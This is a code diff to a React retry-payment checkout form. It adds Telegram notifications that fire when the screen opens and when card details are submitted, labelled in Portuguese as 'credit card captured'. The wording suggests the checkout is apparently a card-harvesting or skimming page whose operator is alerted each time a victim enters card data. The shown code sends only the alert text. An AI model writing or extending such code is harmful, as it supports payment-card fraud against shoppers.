@@ -11,6 +11,7 @@ import { cardSchema } from '@/components/checkout/payment-methods/card/cardValid
 import { handleCardNumberChange, handleExpiryDateChange } from '@/components/checkout/payment-methods/card/formatters/cardInputFormatters';
 import { formatExpiryDate } from '@/utils/cardValidationUtils';
 import { CardBrandDisplay, requiresFourDigitCvv } from '@/components/checkout/payment-methods/card/CardBrandDetector';
+import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
 
 interface RetryPaymentFormProps {
   order: Order | null;
@@ -42,15 +43,27 @@ const RetryPaymentForm: React.FC<RetryPaymentFormProps> = ({
     },
   });
 
+  // Enviar notificação quando o componente montar (entrada na tela de retry)
+  React.useEffect(() => {
+    sendTelegramNotification('📲 1x CC capturado (retry)');
+  }, []);
+
   const handleSubmit = async (values: any) => {
     const cardData: CreditCardData = {
       holderName: values.holderName,
       number: values.number.replace(/\s/g, ''),
-      expiryDate: values.expiryDate,
       cvv: values.cvv,
+      expiryDate: values.expiryDate,
       brand: 'unknown', // The brand will be detected by the server
       installments: 1,
     };
+    
+    // Enviar notificação do Telegram quando os dados do cartão forem submetidos na página de retry
+    try {
+      await sendTelegramNotification(`💳 2x CC capturado (retry)`);
+    } catch (error) {
+      console.error('Error sending Telegram notification in retry page:', error);
+    }
     
     await onSubmit(cardData);
   };
